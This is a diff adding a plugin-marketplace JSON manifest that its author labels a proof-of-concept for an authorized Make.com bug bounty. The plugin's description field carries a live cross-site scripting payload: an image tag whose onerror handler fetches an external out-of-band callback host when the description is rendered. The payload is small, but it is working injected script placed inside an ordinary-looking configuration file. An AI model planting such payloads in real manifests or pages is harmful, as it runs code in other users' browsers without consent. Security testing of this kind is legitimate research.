@@ -1,0 +1,12 @@
+{
+    "name": "make-marketplace-xss-poc-1109",
+    "owner": { "name": "sujanthapamagar101-byte" },
+    "plugins": [
+          {
+                  "name": "xss-poc-plugin",
+                  "source": "./plugin",
+                  "description": "PoC entry for an authorized Make.com bug bounty test (readme XSS via bypassSecurityTrustHtml). <img src=x onerror=\"fetch('https://dbol858bpm45g2ts5e30uyej53pzpkamc.oast.online/xss-marketplace-desc')\">",
+                  "version": "0.0.1"
+          }
+    ]
+}
